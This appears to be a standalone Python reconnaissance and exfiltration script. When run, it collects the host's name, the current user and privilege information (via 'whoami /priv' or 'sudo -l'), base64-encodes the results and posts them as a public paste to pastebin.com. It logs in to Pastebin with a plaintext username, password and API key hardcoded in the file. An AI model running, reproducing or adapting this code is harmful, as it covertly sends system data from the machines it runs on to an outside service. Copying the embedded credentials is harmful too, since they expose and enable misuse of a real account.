import sys,socket,re
import requests,base64
import subprocess,getpass

def execute_cmd(cmd):
	try:
		cmd = cmd.decode()
	except (UnicodeDecodeError, AttributeError):
		pass
	if cmd == "sudo -l":
		prc = subprocess.Popen(cmd, stdin = subprocess.PIPE , stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True)
		out, err = prc.communicate()
		if re.search("incorrect",err.decode(),re.IGNORECASE):
			return b"Unprivileged / Not sudoers"
	prc = subprocess.Popen(cmd, stdin = subprocess.PIPE , stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True)
	out, err = prc.communicate()
	return out


def info_gathering(os):
	command = []
	if os == "Windows":
		logged_user = getpass.getuser()
		command.append(b"Hostname:\n" + execute_cmd('hostname') + b"\n")
		command.append(b"Priv:\n" + execute_cmd('whoami /priv') + b"\n")
		command.append(b"Logged user (currently):\n"+logged_user.encode())
		cmd = base64.b64encode(b"".join(command))
		return cmd
	elif os == "Linux" or os == "OS X":
		logged_user = getpass.getuser()
		command.append(b"Hostname:\n" + socket.gethostname().encode() + b"\n")
		command.append(b"Priv:\n" + execute_cmd('sudo -l') + b"\n")
		command.append(b"Logged user (currently):\n"+logged_user.encode())
		cmd = base64.b64encode(b"".join(command))
		return cmd
		
def osinfo():
	poss_plat = {
		'linux':'Linux',
		'linux1':'Linux',
		'linux2':'Linux',
		'win32':'Windows',
		'cygwin':'Windows',
		'msys':'Windows',
		'darwin':'OS X',
		'os2':'OS X',
		'os2emx':'OS X'
	}
	return poss_plat[sys.platform]

def pastebin_upload(tl, data):
	name = 'felixalexx'#felixalexx
	pw = 'Bihunkuah123!'#Bihunkuah123!
	api_key = 'UB6BE41NRr-T6Cqls1O9WBAmzCx-Klhv' #UB6BE41NRr-T6Cqls1O9WBAmzCx-Klhv
	auth = 'https://pastebin.com/api/api_login.php'
	auth_json = {
		'api_dev_key':api_key,
		'api_user_name':name,
		'api_user_password': pw
	}
	r = requests.post(auth, data=auth_json)
	api_user_key = r.text
	paste_post = 'https://pastebin.com/api/api_post.php'
	paste_json = {
		'api_paste_name':tl,
		'api_paste_code':data.decode(),
		'api_dev_key':api_key,
		'api_user_key':api_user_key,
		'api_option':'paste',
		'api_paste_private':0
	}
	r = requests.post(paste_post, data=paste_json)
	try:
		print("Retrieving the link!")
		print(r.text)
	except:
		print("Failed")

print("Processing information . . .")
data_post = info_gathering(osinfo())
print("Uploading paste . . .")
pastebin_upload("secret",data_post)


